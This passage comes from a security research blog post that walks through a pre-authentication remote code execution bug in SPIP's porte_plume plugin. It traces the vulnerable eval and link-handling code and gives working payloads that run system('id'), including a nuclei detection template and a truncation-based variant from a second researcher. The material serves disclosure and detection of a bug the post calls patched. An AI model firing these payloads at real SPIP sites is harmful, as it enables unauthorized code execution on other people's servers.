        <span class="hljs-attr">"syndic_articles"</span>: <span class="hljs-string">"safehtml(%s)"</span>
    },
    <span class="hljs-attr">"TEXTE"</span>: {
        <span class="hljs-attr">"0"</span>: <span class="hljs-string">"propre(%s, $connect, $Pile[0])"</span>,
        <span class="hljs-attr">"forums"</span>: <span class="hljs-string">"liens_nofollow(safehtml(propre(interdit_html(%s), $connect, $Pile[0])))"</span>
    },
    <span class="hljs-attr">"TITRE"</span>: {
        <span class="hljs-attr">"0"</span>: <span class="hljs-string">"supprimer_numero(typo(%s, \"TYPO\", $connect, $Pile[0]))"</span>,
        <span class="hljs-attr">"forums"</span>: <span class="hljs-string">"liens_nofollow(safehtml(typo(interdit_html(%s), \"TYPO\", $connect, $Pile[0])))"</span>
    },
    <span class="hljs-attr">"TYPE"</span>: {
        <span class="hljs-attr">"0"</span>: <span class="hljs-string">"typo(%s, \"TYPO\", $connect, $Pile[0])"</span>,
        <span class="hljs-attr">"mots"</span>: <span class="hljs-string">"supprimer_numero(typo(%s, \"TYPO\", $connect, $Pile[0]))"</span>
    },
    <span class="hljs-attr">"DESCRIPTIF_SITE_SPIP"</span>: [<span class="hljs-string">"propre(%s, $connect, $Pile[0])"</span>],
    <span class="hljs-attr">"SLOGAN_SITE_SPIP"</span>: [<span class="hljs-string">"typo(%s, \"TYPO\", $connect, $Pile[0])"</span>],
    <span class="hljs-attr">"ENV"</span>: [<span class="hljs-string">"entites_html(%s,true)"</span>],
    <span class="hljs-attr">"*"</span>: {
        <span class="hljs-attr">"0"</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">"DATA"</span>: <span class="hljs-string">"safehtml(%s)"</span>
    },
    <span class="hljs-attr">"VALEUR"</span>: {
        <span class="hljs-attr">"DATA"</span>: <span class="hljs-string">"safehtml(%s)"</span>
    },
    <span class="hljs-attr">"PARAMETRES_FORUM"</span>: [<span class="hljs-string">"spip_htmlspecialchars(%s)"</span>],
    <span class="hljs-attr">"NOTES"</span>: {
        <span class="hljs-attr">"forums"</span>: <span class="hljs-string">"liens_nofollow(safehtml(propre(interdit_html(%s), $connect, $Pile[0])))"</span>
    },
    <span class="hljs-attr">"URL_SITE"</span>: {
        <span class="hljs-attr">"forums"</span>: <span class="hljs-string">"safehtml(vider_url(%s))"</span>
    },
    <span class="hljs-attr">"EMAIL_AUTEUR"</span>: {
        <span class="hljs-attr">"forums"</span>: <span class="hljs-string">"safehtml(vider_url(%s))"</span>
    },
    <span class="hljs-attr">"URL"</span>: {
        <span class="hljs-attr">"syndic_articles"</span>: <span class="hljs-string">"safehtml(%s)"</span>
    },
    <span class="hljs-attr">"URL_SOURCE"</span>: {
        <span class="hljs-attr">"syndic_articles"</span>: <span class="hljs-string">"safehtml(%s)"</span>
    },
    <span class="hljs-attr">"LESAUTEURS"</span>: {
        <span class="hljs-attr">"syndic_articles"</span>: <span class="hljs-string">"safehtml(%s)"</span>
    },
    <span class="hljs-attr">"FICHIER"</span>: [<span class="hljs-string">"get_spip_doc(%s)"</span>],
    <span class="hljs-attr">"CREDITS"</span>: {
        <span class="hljs-attr">"documents"</span>: <span class="hljs-string">"typo(%s, \"TYPO\", $connect, $Pile[0])"</span>
    },
    <span class="hljs-attr">"SLOGAN"</span>: {
        <span class="hljs-attr">"plugins"</span>: <span class="hljs-string">"propre(%s, $connect, $Pile[0])"</span>
    },
    <span class="hljs-attr">"VMAX"</span>: {
        <span class="hljs-attr">"plugins"</span>: <span class="hljs-string">"denormaliser_version(%s)"</span>
    },
    <span class="hljs-attr">"DESCRIPTION"</span>: {
        <span class="hljs-attr">"paquets"</span>: <span class="hljs-string">"propre(%s, $connect, $Pile[0])"</span>
    },
    <span class="hljs-attr">"VERSION"</span>: {
        <span class="hljs-attr">"paquets"</span>: <span class="hljs-string">"denormaliser_version(%s)"</span>
    },
    <span class="hljs-attr">"MAJ_VERSION"</span>: {
        <span class="hljs-attr">"paquets"</span>: <span class="hljs-string">"denormaliser_version(%s)"</span>
    }
}
</code></pre>

<p>Here’s the list of functions we can call with <code>data</code> as a parameter:</p>

<ul>
<li>safehtml</li>
<li>propre</li>
<li>entites_html</li>
<li>liens_nofollow</li>
<li>interdit_html</li>
<li>supprimer_numero</li>
<li>typo</li>
<li>normaliser_date</li>
<li>spip_htmlspecialchars</li>
<li>vider_url</li>
<li>get_spip_doc</li>
<li>denormaliser_version</li>
</ul>

<p>As an example, <code>field=TAGS</code> can be used to avoid applying an additional function to spip’s sanitizer:</p>

<pre><code class="language-php hljs"><span class="hljs-string">"TAGS"</span>:{<span class="hljs-string">"0"</span>:<span class="hljs-string">"%s"</span>, ...}
</code></pre>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/champ-tags-1.png" alt=""></p>

<p>Here, using <code>field=TEXT</code> calls the <code>own</code> function:</p>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/champ-tags-2.png" alt=""></p>

<p>Unfortunately, none of these functions seems to be vulnerable. They’re all short, with no apparent sink for executing arbitrary code.</p>

<h3 id="first-sink-and-partial-exploitation-path">First SINK and partial exploitation path</h3>

<p>Going down into the <code>treatments_previsu</code> function, we find this code in php:</p>

<pre><code class="language-php hljs">...
<span class="hljs-keyword">if</span> (defined(<span class="hljs-string">'_PROTEGE_PHP_MODELES'</span>)) {
	$texte = echappe_retour($texte, <span class="hljs-string">'php'</span> . _PROTEGE_PHP_MODELES, <span class="hljs-string">'traitements_previsu_php_modeles_eval'</span>);
}
...
</code></pre>

<p>This sink is very interesting, because if the global variable <code>_PROTEGE_PHP_MODELES</code> is defined, then a call to the function <code>echappe_retour</code> is made with our parameter <code>$texte</code> and the 2nd interesting function in the 3rd parameter.</p>

<p>As a reminder, here’s the code for the <code>traitements_previsu_php_modeles_eval</code> function:</p>

<pre><code class="language-php hljs"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">traitements_previsu_php_modeles_eval</span><span class="hljs-params">($php)</span> </span>{
	ob_start();
	<span class="hljs-keyword">try</span> {
		$res = <span class="hljs-keyword">eval</span>(<span class="hljs-string">'?'</span> . <span class="hljs-string">'&gt;'</span> . $php);
		$texte = ob_get_contents();
	} <span class="hljs-keyword">catch</span> (\Throwable $e) {
		$texte = <span class="hljs-string">'&lt;!-- Erreur --&gt;'</span>;
	}
	ob_end_clean();
	<span class="hljs-keyword">return</span> $texte;
}
</code></pre>

<p>It takes php code as a parameter and executes it in an eval.</p>

<p><em>Smells good :D</em></p>

<p>Let’s analyze the code of within the <code>echappe_retour</code> function:</p>

<pre><code class="language-php hljs"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echappe_retour</span><span class="hljs-params">($letexte, $source = <span class="hljs-string">''</span>, $filtre = <span class="hljs-string">''</span>)</span> </span>{
	<span class="hljs-keyword">if</span> (strpos($letexte, (string) <span class="hljs-string">"base64$source"</span>)) {
		<span class="hljs-comment">### spip_log(spip_htmlspecialchars($letexte));  ## pour les curieux</span>
		$max_prof = <span class="hljs-number">5</span>;
		<span class="hljs-keyword">while</span> (
			strpos($letexte, <span class="hljs-string">'&lt;'</span>) !== <span class="hljs-keyword">false</span>
			<span class="hljs-keyword">and</span>
			preg_match_all(
				<span class="hljs-string">',&lt;(span|div)\sclass=[\'"]base64'</span> . $source . <span class="hljs-string">'[\'"]\s(.*)&gt;\s*&lt;/\1&gt;,UmsS'</span>,
				$letexte,
				$regs,
				PREG_SET_ORDER
			)
			<span class="hljs-keyword">and</span> $max_prof--
		) {
			<span class="hljs-keyword">foreach</span> ($regs <span class="hljs-keyword">as</span> $reg) {
				$rempl = base64_decode(extraire_attribut($reg[<span class="hljs-number">0</span>], <span class="hljs-string">'title'</span>));
				<span class="hljs-comment">// recherche d'attributs supplementaires</span>
				$at = [];
				<span class="hljs-keyword">foreach</span> ([<span class="hljs-string">'lang'</span>, <span class="hljs-string">'dir'</span>] <span class="hljs-keyword">as</span> $attr) {
					<span class="hljs-keyword">if</span> ($a = extraire_attribut($reg[<span class="hljs-number">0</span>], $attr)) {
						$at[$attr] = $a;
					}
				}
				<span class="hljs-keyword">if</span> ($at) {
					$rempl = <span class="hljs-string">'&lt;'</span> . $reg[<span class="hljs-number">1</span>] . <span class="hljs-string">'&gt;'</span> . $rempl . <span class="hljs-string">'&lt;/'</span> . $reg[<span class="hljs-number">1</span>] . <span class="hljs-string">'&gt;'</span>;
					<span class="hljs-keyword">foreach</span> ($at <span class="hljs-keyword">as</span> $attr =&gt; $a) {
						$rempl = inserer_attribut($rempl, $attr, $a);
					}
				}
				<span class="hljs-keyword">if</span> ($filtre) {
					$rempl = $filtre($rempl);
				}
				$letexte = str_replace($reg[<span class="hljs-number">0</span>], $rempl, $letexte);
			}
		}
	}
	<span class="hljs-keyword">return</span> $letexte;
}
</code></pre>

<p>Our third argument is passed to the <code>$filter</code> variable, which is called in a condition  with a <code>refill</code> parameter.</p>

<p>Quickly, the function checks that our input contains a <code>&lt;span&gt;</code> or <code>&lt;div&gt;</code> tag with a <code>class</code> attribute equal to <code>base64php</code> + <code>_PROTEGE_PHP_MODELES</code>.<br>
Finally, it extracts the <code>title</code> attribute and decodes it in base64 before storing it in the <code>$rempl</code> variable.</p>

<p>If we take the liberty of modifying the php code to set a value for <code>_PROTEGE_PHP_MODELES</code>, we can achieve code execution!</p>

<blockquote>
<p>Small lalu-note here: Congrats to <code>@Chocapikk_</code> on this one, he came first with the following payload <code>&lt;div class="base64php" title="PD9waHAgZWNobyBzeXN0ZW0oJ2lkJyk7Pz4K"&gt;&lt;/div&gt;</code> which works assuming <code>_PROTEGE_PHP_MODELES</code> is empty! 🌻</p>
</blockquote>

<p>I add the following code to the <code>treatments_previsu</code> function:</p>

<pre><code class="language-php hljs">define(<span class="hljs-string">'_PROTEGE_PHP_MODELES'</span>, <span class="hljs-string">'RCE_POC'</span>);
</code></pre>

<p>In order to execute the <code>id</code> command, by forging the following title:</p>

<pre><code class="language-bash hljs">[~/Desktop]$ <span class="hljs-built_in">echo</span> <span class="hljs-string">"&lt;?php system('id')?&gt;"</span> | base64
PD9waHAgc3lzdGVtKCdpZCcpPz4K
</code></pre>

<p>Finally, here’s our payload:</p>

<pre><code class="language-html hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"base64phpRCE_POC"</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"PD9waHAgc3lzdGVtKCdpZCcpPz4K"</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/id-commande-executed.png" alt=""></p>

<h4 id="back-to-reality">Back to reality</h4>

<p>We spent several hours trying to figure out how to define the global variable <code>_PROTEGE_PHP_MODELES</code>.
We had an almost complete code execution, but we were missing this variable.</p>

<p>The only occurrence and definition of <code>_PROTEGE_PHP_MODELES</code> is in the <code>protege_js_modeles</code> function in the <code>ecrire/inc/texte_mini.php</code> file, but it seems impossible to reach the <code>define</code> function call because of the native spip filter.</p>

<p>So we had to move on and find another path to code execution.</p>

<h3 id="presentation-of-spip-templates">Presentation of SPIP templates</h3>

<p>Spip embeds templates called <code>squelettes</code> which are used to render php code.
A markup language specific to SPIP is used to generate this code, and it is in these templates that injection resided a few months ago, resulting in command execution (cf: <a href="https://thinkloveshare.com/hacking/rce_on_spip_and_root_me_v2/">icalendar generation</a>).</p>

<p>Templates can be called up using the <code>data</code> parameter, which is contained in the various plug-in codes as well as in <code>/squelettes-dist/modeles</code>.</p>

<p>An example would be to create <code>foreach.html</code> with the following content:</p>

<pre><code class="language-html hljs xml">#PUCE #ENV{cle} =&gt; #ENV{valeur}<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>
</code></pre>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/foreach-template-call.png" alt=""></p>

<p><em>Note that parameters are not taken into account since they are not in the rendering context</em></p>

<h4 id="finding-and-discovering-templating-tags">Finding and discovering templating tags</h4>

<p>All SPIP templating tags are defined in the <code>ecrire/public/tags.php</code> file.<br>
There are dozens of them, some of which seem very interesting, such as <code>#EVAL</code>:</p>

<ul>
<li><code>#EVAL{code}</code> produces <code>eval('return code;')</code></li>
</ul>

<p>Unfortunately, none of the current templates had this tag.</p>

<p>Then, still looking for a way to define <code>_PROTEGE_PHP_MODELES</code>, we looked for a way to define a variable in PHP’s global context.
Despite the existence of the <code>#SET</code> tag, it didn’t allow us to define the variable for the entire PHP application.</p>

<h3 id="the-right-way">The right way</h3>

<p>We then looked at how PHP loads templates, and made an interesting discovery.</p>

<p>The <code>include_template</code> function from <code>ecrire/public/assembler.php</code> is called to recognize and load the various templates:</p>

<pre><code class="language-php hljs"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inclure_modele</span><span class="hljs-params">($type, $id, $params, $lien, string $connect = <span class="hljs-string">''</span>, $env = [])</span> </span>{

	...

	<span class="hljs-keyword">if</span> (!$fond <span class="hljs-keyword">and</span> !trouve_modele($fond = $type)) {
		spip_log(<span class="hljs-string">"Modele $type introuvable"</span>, _LOG_INFO_IMPORTANTE);
		$compteur--;
		<span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
	}
	$fond = <span class="hljs-string">'modeles/'</span> . $fond;

	...

	<span class="hljs-keyword">if</span> (
		strstr(
			<span class="hljs-string">' '</span> . ($classes = extraire_attribut($retour, <span class="hljs-string">'class'</span>)) . <span class="hljs-string">' '</span>,
			<span class="hljs-string">'spip_lien_ok'</span>
		)
	) {
		$retour = inserer_attribut(
			$retour,
			<span class="hljs-string">'class'</span>,
			trim(str_replace(<span class="hljs-string">' spip_lien_ok '</span>, <span class="hljs-string">' '</span>, <span class="hljs-string">" $classes "</span>))
		);
	} <span class="hljs-keyword">else</span> {
		<span class="hljs-keyword">if</span> ($lien) {
			$retour = <span class="hljs-string">"&lt;a href=\""</span> . $lien[<span class="hljs-string">'href'</span>] . <span class="hljs-string">"\" class=\""</span> . $lien[<span class="hljs-string">'class'</span>] . <span class="hljs-string">"\"&gt;"</span> . $retour . <span class="hljs-string">'&lt;/a&gt;'</span>;
		}
	}	
	...
}
</code></pre>

<p>The function checks whether the template name exists and, if it does, adds the content to the response.<br>
The vulnerability lies here, in the last lines, the parameters <code>$link['href]</code> and <code>$link['class]</code> are not sanitized!</p>

<p>So, if we control one of the two parameters, we’ll be able to inject php tags and execute our malicious code!</p>

<h3 id="method-1-long-and-tedious">Method 1: Long and tedious</h3>

<p>The <code>$link</code> variable is passed as a function parameter. Going back up the function call tree, we find that it’s the <code>process</code> function that calls <code>include_modele</code>:</p>

<p>So we’re looking for the origin of <code>$m['link']</code>:</p>

<pre><code class="language-php hljs">$modele = inclure_modele($m[<span class="hljs-string">'type'</span>], $m[<span class="hljs-string">'id'</span>], $params, $m[<span class="hljs-string">'lien'</span>], $connect ?? <span class="hljs-string">''</span>, $env);
</code></pre>

<p>By reading the code, we understand that <code>$m</code> comes from <code>$models</code>, itself coming from :</p>

<pre><code class="language-php hljs">$modeles = <span class="hljs-keyword">$this</span>-&gt;collecter($texte, [<span class="hljs-string">'collecter_liens'</span> =&gt; <span class="hljs-keyword">true</span>]);
</code></pre>

<p>Let’s skip the dozens of boring php lines, but here’s what you need to remember:</p>

<ul>
<li>The <code>process</code> function calls the vulnerable <code>include_modele</code> function with its <code>$m['link']</code> parameter</li>
<li><code>$m['link']</code> comes from a call to the <code>collecter</code> function, which takes our complete input as a parameter</li>

<li><p>This function <code>collecter</code> calls the function <code>collecteur</code> (yes ..) with the following regex:</p>

<ul>
<li><code>@&lt;([a-z_-]{3,})\s*([0-9]*)\s*([|](?:&lt;[^&lt;&gt;]*&gt;|[^&gt;])*?)?\s*/?&gt;@isS</code></li>
</ul></li>

<li><p>If there’s a match with this regex in our payload, then it performs further checks on tag length or type and finally parses the following attributes, which it stores in the <code>link</code> array:</p>

<ul>
<li>href</li>
<li>class</li>
<li>type</li>
<li>title</li>
<li>hreflang</li>
</ul></li>
</ul>

<p>As you can see, the <code>class</code> and <code>href</code> parameters can be arbitrarily controlled using the <code>&lt;a&gt;</code> tag.</p>

<p>Here’s a payload that passes the various checks and defines the two vulnerable variables:</p>

<p><em>Be careful not to forget <code>&lt;foreach|a|b&gt;</code> in the <code>&lt;a&gt;</code> tag to call the include_modele function</em></p>

<pre><code class="language-php hljs">&lt;a href=<span class="hljs-string">"A"</span> <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">B</span>" <span class="hljs-title">type</span>="<span class="hljs-title">C</span>" <span class="hljs-title">title</span>="<span class="hljs-title">D</span>" <span class="hljs-title">hreflang</span>="<span class="hljs-title">E</span>"&gt;&lt;<span class="hljs-title">foreach</span>|<span class="hljs-title">a</span>|<span class="hljs-title">b</span>&gt;&lt;/<span class="hljs-title">a</span>&gt;
</span></code></pre>

<p>Finally, we can add our payload <code>%26lt;?php system('id');die(); ?%26gt;</code> to one of the two vulnerable fields:</p>

<pre><code class="language-html hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"A"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"%26lt;?php system('id');die(); ?%26gt;"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"C"</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"D"</span> <span class="hljs-attr">hreflang</span>=<span class="hljs-string">"E"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">foreach|a|b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
# or
<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"%26lt;?php system('id');die(); ?%26gt;"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"B"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"C"</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"D"</span> <span class="hljs-attr">hreflang</span>=<span class="hljs-string">"E"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">foreach|a|b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
</code></pre>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/rce1.png" alt=""></p>

<h3 id="method-2-fast-and-efficient">Method 2: Fast and efficient</h3>

<p>We only saw this line in the comments after completing the first method:</p>

<pre><code class="hljs">// Si un lien a ete passe en parametre, ex: [&lt;modele1&gt;-&gt;url] ou [&lt;modele1|title_du_lien{hreflang}-&gt;url]
</code></pre>

<p>It is thus possible to pass a link as a parameter using <code>[]</code>!<br>
Once again, you get command execution:</p>

<pre><code class="language-php hljs">data=[&lt;<span class="hljs-keyword">foreach</span>|a|b&gt;-&gt;%<span class="hljs-number">26</span>lt;?php system(<span class="hljs-string">'id'</span>);<span class="hljs-keyword">die</span>(); ?%<span class="hljs-number">26</span>gt;&gt;]
</code></pre>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/rce2.png" alt=""></p>

<p>The <code>process</code> function is called by <code>process_models</code>, itself called by the <code>own</code> function.<br>
So <code>field=TEXT</code> is enough to trigger code execution!</p>

<h3 id="detection">Detection</h3>

<p>Here’s a nuclei template for a quick detection of the vulnerability:</p>

<pre><code class="language-html hljs xml">id: spip-preauth-rce-porteplume

info:
  name: SPIP PortePlume plugin Preauth RCE
  author: Vozec 
  severity: critical
  description: |
    SPIP PortePlume Preauth RCE (@cr: Vuln found by Laluka)

http:
  - raw:
    - |
      POST /index.php?action=porte_plume_previsu HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
      Accept: */*
      Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
      Accept-Encoding: gzip, deflate, br
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      X-Requested-With: XMLHttpRequest
      Origin: http://{{Hostname}}
      Connection: keep-alive
      Sec-Fetch-Dest: empty
      Sec-Fetch-Mode: cors
      Sec-Fetch-Site: same-origin
      Priority: u=0

      champ=TEXTE&amp;objet=article&amp;data=[<span class="hljs-tag">&lt;<span class="hljs-name">foreach|a|b</span>&gt;</span>-&gt;%26lt;?php "\x73\x79\x73\x74\x65\x6d"('id');?%26gt;&gt;]

    matchers:
      - type: word
        part: body
        words:
          - "<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">\</span>"<span class="hljs-attr">preview</span>\"&gt;</span>" ### Maybe windows server =&gt; If reflected then vulnerable version
          - "uid="
        condition: or

    extractors:
      - type: regex
        name: result
        group: 1
        internal: False
        part: body_1
        regex:
          - "<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">'.*/(.*?)'</span>&gt;</span>"
</code></pre>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/nuclei.png" alt=""></p>

<blockquote>
<p>Lalu: More cool stuff from @Vozec at <a href="https://vozec.fr/">https://vozec.fr/</a></p>
</blockquote>

<hr>

<h3 id="write-up-from-guilhemrioux">Write-Up from <strong>@GuilhemRioux</strong></h3>

<p>Laluka gave a challenge recently on finding a Pre-Auth Remote Code Execution on SPIP.<br>
He also gave us a hint on where to look, by adding that it is in the <code>porte_plume</code> plugin.<br>
From now on we can start digging at SPIP.</p>

<h4 id="setup">Setup</h4>

<p>As I like mixing static and dynamic code analysis when looking for vulns, I just ran my generic docker-compose for php apps.<br>
This way I got a Xdebug and an Apache server ready to use.</p>

<h4 id="finding-the-sink">Finding the sink</h4>

<p>Now that we have done the setup we can start looking at the code. I simply go into the folder of the <code>porte_plume</code> plugin (packaged in the spip.zip given by laluka) and look for obvious dangerous functions.</p>

<blockquote>
<p>Lalu-Snip: Screenshot &amp; explanation already part of the previous writeups</p>
</blockquote>

<p>However reaching the first eval is not hard, because it is triggered when trying to preview an article:</p>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/trigger_porte_plume.png" alt=""></p>

<p>At first I did not find any ref to this function, but this is because I do not know <code>SPIP</code> at all. I was looking inside <code>*.php</code> files! In fact <code>SPIP</code> seems to have is own language and uses it inside its custom page, so here is the reference to the function call:</p>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/call_traitement_previsu.png" alt=""></p>

<p>Anyway, once done we can see that the first eval cannot be used as we do not control any of its arguments… However the other looks better but seems hard to reach as it required the constant <code>_PROTEGE_PHP_MODELES</code> to be defined:
<img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/going_into_second_eval.png" alt=""></p>

<h4 id="reaching-the-sink">Reaching the sink</h4>

<p>Ok, so in order to reach the second <code>eval</code> located in <code>traitements_previsu_php_modeles_eval</code> we must reach the first <code>eval</code>
located in <code>traitements_previsu</code> with the constant <code>_PROTEGE_PHP_MODELES</code> defined.</p>

<p>However this constant is defined in <code>texte_mini.php</code>:
<img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/define_constant.png" alt=""></p>

<p>Here, <code>creer_uniqid</code> generates a uniqid with entropy, so it is hard to predict. So the constant is defined, but we cannot predict its value (Or it seems really hard // lalu+1).</p>

<p>Here what is important to notice is that the function is related to <code>modeles</code>. It is important, in my opinion, to read the doc of the software when looking for vulnerabilities. So I looked for modeles in the <code>SPIP</code> documentation, and I found what I needed.</p>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/spip_doc_modeles.png" alt=""></p>

<p>And here is the regex used by <code>SPIP</code> to identify them:</p>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/modeles_reg.png" alt=""></p>

<p>There are also default modeles on SPIP, which are (according to the documentation):</p>

<ol>
<li>img</li>
<li>doc</li>
<li>emb</li>
<li>article_mots</li>
<li>article_traductions</li>
<li>lesauteurs</li>
</ol>

<p>As I do not understand every models above, I used the <code>img</code>, <code>doc</code>, and <code>emb</code> models.</p>

<p>Okay so let’s try to reach the <code>protege_js_modeles</code> function by running the payload: <code>&lt;img|test&gt;</code></p>

<p>When doing this, modeles included in the text are managed by the function <code>Modeles::traiter</code>. This function tries to go through all the models and renders them as they should, by calling another function named <code>inclure_modele</code> within <code>assembler.php</code>.</p>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/parcourir_modeles.png" alt=""></p>

<p>I did not look at the whole function, but from what I understood, if the model contains a link, then it will be returned in the classical <code>&lt;a&gt;</code> tag:</p>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/render_modele.png" alt=""></p>

<p>By looking at the documentation (once again), it was possible to see how to create a link:</p>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/insert_link_model.png" alt=""></p>

<p>So I tried this exact payload and we reached the famous code <code>protege_js_modeles</code>. The code takes our text as argument, so we can also control the parameter!<br>
To setup the constant <code>_PROTEGE_PHP_MODELES</code> we just have to add a php tag inside the link, and hop we hit the breakpoint:</p>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/payload_test.png" alt=""></p>

<p>And here is the result with the dynamic debug:</p>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/bp_hit2.png" alt=""></p>

<p>With this we can get back to the <code>eval</code> statement, and check the arguments given by our input.<br>
I ran this simple payload as a test: <code>[&lt;doc|test&gt;-&gt;&lt;?php echo "test";?&gt;]</code></p>

<p>And here is the result in the eval:</p>

<pre><code class="language-php hljs"><span class="hljs-keyword">eval</span>(<span class="hljs-string">'?&gt;&lt;?php&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;echo&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"test"&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;?&gt;'</span>);
</code></pre>

<p>Which throws a deserved syntax error.</p>

<p>Our payload has been translated into formatted html text, so php code is highlighted, and then cannot be evaluated anymore. This is our last step before pwning the target!</p>

<p>So the problem for me here is that <code>&lt;?php</code> become <code>&lt;span style="color: #000000"&gt;&lt;?php&lt;/span&gt;</code> than is not a valid eval anymore (<code>eval("&lt;?php&lt;/span&gt;")</code> -&gt; Error). In order to get rid of this annoying tag I choose to use the size limit shown in the code:</p>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/fonction_code_echappement.png" alt=""></p>

<p>So the payload is truncated each 30000 chars, thus it is possible to leave the annoying tag behind in order to eval only php code unformatted. I ran it with a big payload, and added a quote in front of the real payload in order to protect any other text formatting, and here we are:</p>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/junk_eval.png" alt=""></p>

<p>And then the second eval is triggered with only code wanted:</p>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/clean_eval.png" alt=""></p>

<p>From there we recover the content of the payload in the response:</p>

<p><img class="img_big" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/exploit_res.png" alt=""></p>

<p>This was a fun vulnerability to find, and also a nice challenge, I hope I’ll get to fight Spip in a future assessment! :D</p>

<blockquote>
<p>Lalu &amp; Vozec note: Once Guilhem agreed to share this exploit so we could analyze it, we were <code>0_0'</code> as this exploit path wasn’t expected! Ironically, It’s also patched by the initial patch. So we’re sad that it’s not a new 0day, and happy to have <code>@GuilhemRioux</code> as a co-author here! 🌹</p>
</blockquote>

<hr>

<h2 id="outro">Outro</h2>

<ul>
<li>We <em>all</em> hope you’ve had a fun time reading this co-written article 💌</li>
<li>See you in a few, and be aware that… New challenges are on their way 😉</li>
<li>10k thank you to our numerous proof-readers <a href="https://x.com/0x1sis">@0x1sis</a>, <a href="https://x.com/newsoft">@newsoft</a>, <a href="https://x.com/Fransosiche">@Fransosiche</a>, <a href="https://www.linkedin.com/in/kelig-avignon-785521aa/">@Kelig</a>, <a href="https://x.com/Nishacid">@Nishacid</a>, <a href="https://x.com/NoobosaurusR3x">@NoobosaurusR3x</a>, <a href="https://x.com/skilo_sh">@askilow</a> 🫶</li>
<li>Again, thanks for playing, and happy summer you all! 🌈</li>
</ul>

  </div>
  

<div class="post--navigation post--navigation-single">
    
    <a href="https://thinkloveshare.com/hacking/kong-konga-exploitation-and-hardening/" class="post--navigation-prev">
      <svg aria-hidden="true" class="svg-inline--fa fa-chevron-left fa-w-10" data-prefix="fa" data-icon="chevron-left" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512" data-fa-i2svg=""><path fill="currentColor" d="M34.52 239.03L228.87 44.69c9.37-9.37 24.57-9.37 33.94 0l22.67 22.67c9.36 9.36 9.37 24.52.04 33.9L131.49 256l154.02 154.75c9.34 9.38 9.32 24.54-.04 33.9l-22.67 22.67c-9.37 9.37-24.57 9.37-33.94 0L34.52 272.97c-9.37-9.37-9.37-24.57 0-33.94z"></path></svg><!-- <i aria-hidden="true" class="fa fa-chevron-left"></i> -->
      <span class="navigation-tittle">Kong &amp; Konga Exploitation &amp; Hardening</span>
    </a>
    
    
    <a href="https://thinkloveshare.com/hacking/spip_preauth_rce_2024_part_2_a_big_upload/" class="post--navigation-next">
